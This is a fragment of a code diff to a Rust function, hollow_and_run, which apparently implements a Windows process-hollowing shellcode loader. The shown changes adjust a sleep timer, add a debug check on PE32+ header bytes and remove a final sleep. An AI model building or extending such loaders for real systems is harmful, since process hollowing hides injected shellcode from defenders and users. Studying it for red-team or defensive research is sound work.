@@ -13,7 +13,7 @@ const E_LFANEW_OFFSET: usize = 0x3C;
 const OPTHDR_ADDITIONAL_OFFSET: usize = 0x28;
 
 pub fn hollow_and_run(shellcode: &[u8]) {
-    let sleep_timer = time::Duration::from_millis(5000);
+    let sleep_timer = time::Duration::from_millis(20000);
     // Create empty StartupInfoA struct for use in CreateProcess
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/struct.STARTUPINFOW.html
@@ -96,6 +96,9 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     let entry_point_rva = rco_utils::array_to_u32_lit_end(&header_buffer[opthdr_offset..opthdr_offset + 0x04].try_into().unwrap());
     let entry_point_address = entry_point_rva as u64 + pe_base_address;
 
+    if header_buffer[e_lfanew as usize + 0x18] == 11 && header_buffer[e_lfanew as usize + 0x19] == 2 {
+        println!("Everything up to here looks correct; the optional header starts with 11, 2")
+    }
     println!("pe_base_address = {pe_base_address}");
     println!("e_lfanew = {e_lfanew}");
     println!("entry_point_rva {entry_point_rva}");
@@ -119,5 +122,4 @@ pub fn hollow_and_run(shellcode: &[u8]) {
     }
 
     println!("Resume result was {resume_result}");
-    thread::sleep(sleep_timer);
 }
